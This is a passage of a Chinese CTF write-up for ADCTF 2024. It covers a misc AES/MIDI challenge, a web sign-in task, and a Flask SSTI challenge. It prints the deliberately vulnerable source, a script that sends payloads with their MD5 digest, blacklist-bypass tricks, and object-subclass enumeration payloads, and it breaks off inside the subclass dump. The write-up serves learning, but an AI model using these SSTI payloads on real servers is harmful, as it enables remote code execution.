class="string">&quot;1GAENCum6myT9DJn1One+RpaAZPP/s8xEE/iSF4yu+Drwsr+ThYOqIG0sT8UYXH0E81kjmg1DBSIUA823y3tQ2UXM336EUQWsKbaesqpXTM=&quot;</span></span><br><span class="line">key = <span class="string">&quot;TOHOMUSICDAISUKI&quot;</span></span><br><span class="line"></span><br><span class="line">decrypted_text = aes_decrypt(ciphertext_base64, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的文本:&quot;</span>, decrypted_text)</span><br></pre></td></tr></table></figure>

<p>发现解密出来为乱码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_k1imIquXdZ.png"></p>
<p>然后我又去对了个思路，结果rkk跟我说摩斯电码不分大小写</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/QQ_KZwHibNKAN.png"></p>
<p>行吧，吃了没经验的亏，把key改为小写后得到flag：<code>flag&#123;h0orAy!y0U_v3_a1r3@dY_l33rnt_a_1ittl3_b17_aB0uT_b1ak_m1dI&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_7KmXBzxHkU.png"></p>
<p>下面附上一个其他选手的提取脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mido <span class="keyword">import</span> MidiFile</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">midi = MidiFile(<span class="string">&quot;[Black MIDI] Bad Apple!!.mid&quot;</span>)</span><br><span class="line"></span><br><span class="line">track = midi.tracks[<span class="number">12</span>]</span><br><span class="line">high_notes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> track:</span><br><span class="line">    <span class="keyword">if</span> msg.<span class="built_in">type</span> == <span class="string">&quot;note_on&quot;</span> <span class="keyword">and</span> msg.velocity &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> msg.note &gt; <span class="number">0</span>:</span><br><span class="line">            high_notes.append(msg.note)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;高音值序列:&quot;</span>, high_notes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">ascii</span> = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(note) <span class="keyword">for</span> note <span class="keyword">in</span> high_notes)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ASCII 解码结果:&quot;</span>, <span class="built_in">ascii</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Easy-Sign-in-ADCTF"><a href="#Easy-Sign-in-ADCTF" class="headerlink" title="[Easy] Sign_in_ADCTF"></a><strong>[Easy]</strong> Sign_in_ADCTF</h2><blockquote>
<p>出题人: Ak1M1O</p>
</blockquote>
<blockquote>
<p><code>11811</code> 端口对应为 HTTP 服务，请通过 <strong>浏览器</strong> 及 <strong>其他 HTTP 相关工具</strong> 进行访问</p>
</blockquote>
<p>M1O 在宣讲会中签到签退失败，这次他一定要签到成功</p>
<p>打开是一个网页，按F12发现hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_fgclaGnELy.png"></p>
<p>然后凭借手速调用后，提示flag在图片里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_WwerD8Dp1g.png"></p>
<p>在图片的备注中发现要在公众号发送关键词</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_y704E4o3oF.png"></p>
<p>然后发送了就得到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/d7NJpOWQQy.png"></p>
<h2 id="Easy-sst1"><a href="#Easy-sst1" class="headerlink" title="[Easy] sst1"></a><strong>[Easy]</strong> sst1</h2><blockquote>
<p>出题人: unknown</p>
</blockquote>
<blockquote>
<p><code>11811</code> 端口对应为 HTTP 服务，请通过 <strong>浏览器</strong> 及 <strong>其他 HTTP 相关工具</strong> 进行访问</p>
</blockquote>
<p>这是一个超有趣的 CTF 题目～</p>
<p>基于 <em>Flask</em> 的应用，隐藏着一个小小漏洞哦～</p>
<p>你需要通过巧妙地构造输入，绕过一些简单的过滤，触发代码执行，从而拿到 flag！</p>
<p>加油呀，快来挑战一下这个小小的漏洞吧！</p>
<p>看提示明显SSTI题目，顺带得到如下的源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 黑名单字符</span></span><br><span class="line">black_list = [<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># WAF 检测函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主页路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()  <span class="comment"># 读取并返回当前文件的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理用户提交的实验路由</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/exp&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>():</span><br><span class="line">    exp = request.form.get(<span class="string">&quot;exp&quot;</span>)</span><br><span class="line">    digest = request.form.get(<span class="string">&quot;digest&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 exp 和 digest 是否存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;need exp&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;need digest&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 digest 是否匹配 exp 的 MD5 哈希</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> digest == md5(exp.encode()).hexdigest():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;digest not match&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 exp 是否包含黑名单字符</span></span><br><span class="line">    <span class="keyword">if</span> waf(exp):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No hacker&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 渲染用户输入的模板</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(exp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用</span></span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">11111</span>)</span><br></pre></td></tr></table></figure>

<p>看起来就是把payload丢在exp里面，但是digest会进行md5计算，当md5值与digest相等时才会运行payload</p>
<p>并且，题目禁用了<code>[</code>和<code>&#39;</code>，这两个很好绕过，<code>&#39;</code>可以用<code>&quot;</code>直接代替，而<code>[]</code>可以用<code>&lt;super&gt;.__getitem__(index)</code>来代替，先顺手写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">client = httpx.Client(</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic dXNlcjpmNjRhNmFjMDY2Yjg5YzRiNTczOTg3ODE4Y2RiYzM0Ng==&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload = <span class="built_in">input</span>(<span class="string">&quot;Payload&gt; &quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    digest = md5(payload.encode()).hexdigest()</span><br><span class="line">    response = client.post(</span><br><span class="line">        <span class="string">&quot;http://120.76.118.202:33025/exp&quot;</span>, data=&#123;<span class="string">&quot;exp&quot;</span>: payload, <span class="string">&quot;digest&quot;</span>: digest&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(html.unescape(response.text))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就是不断尝试的环节，先用<code>&#123;&#123;''.__class__.__mro__.__getitem__(1)&#125;&#125;</code>得到object，然后调用<code>__subclasses__()</code>找到所有的子类，得到了下面这个特别特别长的list</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;callable_ &#x27;</span>PyCapsule<span class="string">&#x27;&gt;, &lt;class &#x27;</span>cell<span class="string">&#x27;&gt;, &lt;class &#x27;</span>classmethod_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">classmethod</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>code<span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">complex</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>coroutine<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dict_items<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dict_itemiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>dict_ass <span class="string">&#x27;dict_valueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;mappingproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reverseitemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversekeyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversevalueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;clas</span><br><span class="line"><span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_iterator&#x27;</span>&gt;erseiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">list</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>longrange_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>member_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">memoryview</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>method_descripto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>method<span class="string">&#x27;&gt;, &lt;class &#x27;</span>modulede<span class="string">f&#x27;&gt;, &lt;class &#x27;</span>module<span class="string">&#x27;&gt;, &lt;class &#x27;</span>oclass <span class="string">&#x27;pickle.PickleBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;symtable entry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;slticmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;stderrprinter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.Generianext_awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_asend&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_athrow&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_wrapped_value&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;InterpreterID&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;managedbuffer&#x27;</span>&gt;, &lt;ce<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>types.SimpleNamespace<span class="string">&#x27;&gt;, &lt;class &#x27;</span>NoneType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>NotImplementedType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.CallableProxyType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.ProxyType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>weakref.ReferenceType<span class="string">&#x27;&gt;, &lt;class &#x27;</span>types.UnionTodingMap<span class="string">&#x27;&gt;, &lt;class &#x27;</span>fieldnameiterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>formatteriterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>BaseException<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_array_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_bitmap_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>hamt_collision_node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>keys<span class="string">&#x27;&gt;, &lt;class &#x27;</span>items<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_contextvars.Context<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_contextvars.ContextVa<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_contextvars.Token<span class="string">&#x27;&gt;, &lt;class &#x27;</span>Token.MISSING<span class="string">&#x27;&gt;, &lt;class &#x27;</span>filte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">map</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span><span class="built_in">zip</span><span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_ock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._DummyModuleLock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._ModuleLockManage<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib.ModuleSpec<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib.BuiltinImporte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_frozen_import<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_frozen_importlib._ImportLockContext<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread.lock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread.RLock<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread._localdummy<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_thread._local<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_io._IOBase<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_io._BytesIOBuffe<span class="string">r&#x27;rementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.ScandirIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.DirEntry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._LoaderBasics&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frernal.FileLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespacePath&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespaceLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.PathFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_exter</span></span><br><span class="line"><span class="string">&lt;class &#x27;</span>codecs.Codec<span class="string">&#x27;&gt;, &lt;class &#x27;</span>codecs.IncrementalEncode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.IncrementalDecode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.StreamReaderWrite<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>codecs.StreamRecode<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_abc._abc_data<span class="string">&#x27;&gt;, &lt;class &#x27;</span>abc.ABCtions.abc.Hashable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Awaitable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.AsyncIterable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Iterable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Sized<span class="string">&#x27;&gt;, &lt;class &#x27;</span>collections.abc.Containe<span class="string">r&#x27;&gt;, &lt;cabc.Callable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_distutils_hack._TrivialRe&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_distutils_hack.Dist &lt;class &#x27;</span>_distutils_hack.shim<span class="string">&#x27;&gt;, &lt;class &#x27;</span>__future__._Feature<span class="string">&#x27;&gt;, &lt;class &#x27;</span>itertools.accumulate<span class="string">&#x27;&gt;, &lt;class &#x27;</span>itertools.combinations<span class="string">&#x27;&gt;, &lt;class &#x27;</span>itertools.combinations_with_replacement<span class="string">&#x27;&gt;, &lt;class &#x27;</span>itertools.cycle<span class="string">&#x27;&gt;, dropwhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.filterfalse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertoolsitertools.zip_longest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.pairwise&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;cle<span class="string">&#x27;&gt;, &lt;class &#x27;</span>itertools._tee_dataobject<span class="string">&#x27;&gt;, &lt;class &#x27;</span>operator.attrgette<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>operator.itemgette<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>operator.methodcalle<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>reprlib.Rep<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>collections.deque<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_collectio<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_collections._deque_reverse_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_collections._tuplegette<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>collections._Link<span class="string">&#x27;&gt;, &lt;class &#x27;</span>types.DynamicClassAttribute<span class="string">&#x27;&gt;, &lt;class &#x27;</span>types._GeneratorWrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>functools <span class="string">&#x27;functools._lru_cache_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.KeyWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_list_elem&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partialmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.singledispatchmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.cached_proontextlib.ContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.AsyncContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._GeneratorContextManagerBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._BaseExitStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enum.auto&#x27;</span>&gt;, &lt;enum <span class="string">&#x27;Enum&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re &#x27;</span>re.Match<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_sre.SRE_Scanne<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>sre_parse.State<span class="string">&#x27;&gt;, &lt;class &#x27;</span>sre_parse.SubPattern<span class="string">&#x27;&gt;, &lt;class &#x27;</span>sre_parse.Tokenize<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>re.Scanne<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>typing._Final<span class="string">&#x27;&gt;, &lt;class &#x27;</span>typing._Immutable<span class="string">&#x27;&gt;, peVarLike&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.Generic&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._TypingEmpty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._TypingEllipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.Annotated&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.NamedTuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.TypedDict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.NewTing.io&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.re&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;select.poll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span 